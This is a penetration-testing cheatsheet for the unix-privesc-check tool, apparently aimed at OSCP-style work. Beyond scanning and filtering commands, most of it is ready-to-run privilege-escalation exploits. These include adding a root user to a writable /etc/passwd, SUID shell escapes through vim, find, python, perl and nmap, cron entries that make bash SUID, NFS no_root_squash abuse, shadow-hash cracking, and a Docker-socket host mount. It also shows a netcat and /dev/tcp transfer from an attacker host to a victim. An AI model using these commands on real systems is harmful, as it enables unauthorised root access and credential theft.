# unix-privesc-check Cheatsheet

## Quick Reference

| Command | Purpose |
|---------|---------|
| `unix-privesc-check standard` | Standard audit (fast, most common vectors) |
| `unix-privesc-check detailed` | Deep audit (slow, open file handles, .so libs) |

---

## Installation

```bash
# Kali package
sudo apt install unix-privesc-check

# Direct download (single shell script)
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check
chmod +x unix-privesc-check
```

## Basic Usage

```bash
# Standard scan — fast, covers common vectors
unix-privesc-check standard

# Detailed scan — slow, catches subtle flaws
unix-privesc-check detailed

# Save to file
unix-privesc-check standard > /tmp/upc_results.txt 2>&1

# Grep for warnings only
unix-privesc-check standard 2>&1 | grep -i "WARNING"

# Grep with context
unix-privesc-check standard 2>&1 | grep -B2 -A5 "WARNING"
```

## Transfer to Target

```bash
# Python HTTP server
sudo python3 -m http.server 8000

# SCP
scp unix-privesc-check user@192.168.1.100:/tmp/

# Netcat push
sudo nc -q 5 -lvnp 80 < unix-privesc-check   # Attacker
cat < /dev/tcp/10.10.14.20/80 > /tmp/upc      # Victim
chmod +x /tmp/upc
```

## Output Filtering

```bash
# All warnings
unix-privesc-check standard 2>&1 | grep -i "WARNING"

# SUID-related findings
unix-privesc-check standard 2>&1 | grep -A5 -i "SUID"

# Cron-related findings
unix-privesc-check standard 2>&1 | grep -A5 -i "cron"

# Sudo-related findings
unix-privesc-check standard 2>&1 | grep -A5 -i "sudo"

# Writable file findings
unix-privesc-check standard 2>&1 | grep -A5 -i "writable"

# Passwd/shadow findings
unix-privesc-check standard 2>&1 | grep -A5 -i "passwd\|shadow"

# NFS findings
unix-privesc-check standard 2>&1 | grep -A5 -i "NFS\|nfs"

# Count total warnings
unix-privesc-check standard 2>&1 | grep -c "WARNING"

# Show all section headers
unix-privesc-check standard 2>&1 | grep "^####"
```

## Execution Modes

```bash
# Standard — runs in 5-30 seconds
unix-privesc-check standard

# Detailed — runs in 30 seconds to minutes
# Checks open file handles and parsed script dependencies
unix-privesc-check detailed

# As non-root user (limited visibility)
./unix-privesc-check standard

# As root (full visibility)
sudo unix-privesc-check standard
```

## Common Findings and Exploits

### Finding: World-Writable /etc/passwd

```bash
# unix-privesc-check output:
# WARNING: /etc/passwd is writable

# Exploit — add root user
openssl passwd -1 -salt xyz newpass
echo 'newuser:$1$xyz$hashed:0:0:root:/root:/bin/bash' >> /etc/passwd
su newuser
```

### Finding: SUID Binary

```bash
# unix-privesc-check output:
# WARNING: SUID binary found: /usr/bin/vim

# Exploit SUID vim
/usr/bin/vim -c ':!sh'

# Common SUID exploits
# /usr/bin/find → find -exec /bin/sh -p \;
# /usr/bin/bash → /bin/bash -p
# /usr/bin/python3 → python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
# /usr/bin/perl → perl -e 'exec "/bin/sh";'
# /usr/bin/ruby → ruby -e 'exec "/bin/sh"'
# /usr/bin/env → env /bin/bash -p
# /usr/bin/nawk → awk 'BEGIN {system("/bin/sh")}'
# /usr/bin/less → less /etc/passwd → !sh
# /usr/bin/nmap (old) → nmap --interactive → !sh
```

### Finding: World-Writable Cron Script

```bash
# unix-privesc-check output:
# WARNING: /etc/cron.d/script.sh is writable

# Exploit — append reverse shell or SUID bash
echo '* * * * * root chmod +s /bin/bash' >> /etc/cron.d/script.sh
# Wait for cron
/bin/bash -p
```

### Finding: NFS No Root Squash

```bash
# unix-privesc-check output:
# WARNING: NFS export /shared has no_root_squash

# From attacker
mkdir /tmp/nfs
mount -t nfs 192.168.1.100:/shared /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
umount /tmp/nfs

# On victim
/shared/rootbash -p
```

### Finding: Readable /etc/shadow

```bash
# unix-privesc-check output:
# WARNING: /etc/shadow is readable

# Extract hashes
cat /etc/shadow

# Crack with hashcat or john
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

### Finding: Sudo NOPASSWD

```bash
# unix-privesc-check output:
# WARNING: sudo -l shows NOPASSWD for /usr/bin/vim

# Exploit
sudo /usr/bin/vim -c ':!sh'

# Check GTFOBins for specific binary
# https://gtfobins.github.io/
```

### Finding: Writable /etc/crontab

```bash
# Exploit — add SUID bash entry
echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab
# Wait for cron
/bin/bash -p
```

### Finding: Capabilities on Binary

```bash
# unix-privesc-check may not detect this
# Check manually after
getcap -r / 2>/dev/null

# If python3 has cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid
perl -e 'use POSIX; setuid(0); exec "/bin/bash";'
```

### Finding: Docker Socket Accessible

```bash
# Check if docker group
id | grep docker

# Exploit — mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Quick Exploit Reference

```bash
# GTFOBins — https://gtfobins.github.io/
# SUID binaries → find binary → copy exploit command

# find with SUID
find . -exec /bin/sh -p \;
find / -exec /bin/sh -p \; 2>/dev/null

# python with SUID
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# perl with SUID
perl -e 'exec "/bin/sh";'

# ruby with SUID
ruby -e 'exec "/bin/sh";'

# php with SUID
php -r 'pcntl_exec("/bin/sh");'

# vim with SUID
vim -c ':!sh'

# less with SUID
less /etc/passwd
# then type: !sh

# awk with SUID
awk 'BEGIN {system("/bin/sh")}'

# env with SUID
env /bin/bash -p

# nmap (older versions)
nmap --interactive
!sh
# or
echo 'os.execute("/bin/sh")' > /tmp/x.nse && nmap --script=/tmp/x.nse
```

## Practical Workflow

```
1. Get shell on 192.168.1.100
2. Transfer: scp unix-privesc-check user@192.168.1.100:/tmp/
3. Run: /tmp/unix-privesc-check standard > /tmp/enum.txt 2>&1
4. Filter: grep WARNING /tmp/enum.txt
5. For each WARNING:
   a. Identify the vector (SUID, cron, sudo, permissions)
   b. Check GTFOBins for exploitation technique
   c. Exploit manually
6. Verify: id → uid=0(root)
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `permission denied` on script | `chmod +x unix-privesc-check` |
| `sh: not found` | Target has no POSIX shell; use alternative tool |
| Too many false positives | Use `standard` mode instead of `detailed` |
| Missing output for some checks | Run as root for full visibility |
| No `grep` available | Pipe output to file and analyze later |
| Script hangs | Check for NFS mounts causing timeouts; Ctrl+C |
| `WARNING` not in output | Script found no issues; try `detailed` mode |
| Cannot read /etc/shadow | Normal as non-root; some checks will be incomplete |
| Old kernel not flagged | Tool does not check kernel exploits; use LinPEAS |
| Binary not in PATH | Use full path: `./unix-privesc-check standard` |

## vs LinPEAS Decision Matrix

```
Use unix-privesc-check WHEN:
  ✓ System has minimal tools (no Python, no Go)
  ✓ You need a fast scan (<30 seconds)
  ✓ Target is Solaris, HP-UX, or FreeBSD
  ✓ Non-interactive batch enumeration
  ✓ OSCP exam (simpler output to parse)

Use LinPEAS WHEN:
  ✓ You want comprehensive enumeration
  ✓ System has /bin/sh or you can use Go binary
  ✓ You need password brute-force
  ✓ You need process monitoring for transient crons
  ✓ You need API key/secret scanning
  ✓ You want color-coded prioritized output
  ✓ You need network recon from the victim
```
